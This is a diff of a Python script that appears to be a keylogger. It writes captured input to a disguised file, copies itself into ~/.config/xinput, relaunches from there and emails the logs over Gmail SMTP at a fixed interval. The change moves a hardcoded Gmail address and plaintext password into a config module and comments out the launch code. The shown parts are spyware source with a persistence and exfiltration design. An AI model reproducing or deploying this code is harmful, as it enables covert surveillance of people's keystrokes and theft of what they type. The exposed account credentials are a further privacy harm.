@@ -1,15 +1,11 @@
 #!/usr/bin/env python
 
-import smtplib, re, os, stat
+import smtplib, re, os, stat, config
 from shutil import copyfile
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
 from time import sleep
 from subprocess import Popen, PIPE, check_output
-
-EMAIL = "jhnwck70@gmail.com"
-PASSWORD = "abc123abc123"
-EMAIL_SERVER = "smtp.gmail.com"
 
 SLEEP_INTERVAL = 30
 LOG_FILE = "/tmp/xinput.txt"
@@ -27,12 +23,12 @@ def send_mail(subject, content):
 	msg = MIMEMultipart()
 	msg['Subject'] = subject
 	msg.attach(MIMEText(content))
-	mailer = smtplib.SMTP(EMAIL_SERVER, 587)
+	mailer = smtplib.SMTP(config.EMAIL_SERVER, 587)
 	
 	mailer.starttls()
-	mailer.login(EMAIL, PASSWORD)
+	mailer.login(config.EMAIL, config.PASSWORD)
 
-	mailer.sendmail(EMAIL, EMAIL, msg.as_string())
+	mailer.sendmail(config.EMAIL, config.EMAIL, msg.as_string())
 	mailer.close()
 
 
@@ -77,12 +73,13 @@ def send_mail_reports_every(interval):
 			pass
 
 
+print config.test
 current_file = os.path.realpath(__file__)
 destination_file = HOME_DIRECTORY + "/.config/xinput"
 
-if current_file != destination_file:
-	initialize()
-	Popen(destination_file)
-else:
-	start_logging(LOG_FILE)
-	send_mail_reports_every(SLEEP_INTERVAL)
+# if current_file != destination_file:
+# 	initialize()
+# 	Popen(destination_file)
+# else:
+# 	start_logging(LOG_FILE)
+# 	send_mail_reports_every(SLEEP_INTERVAL)
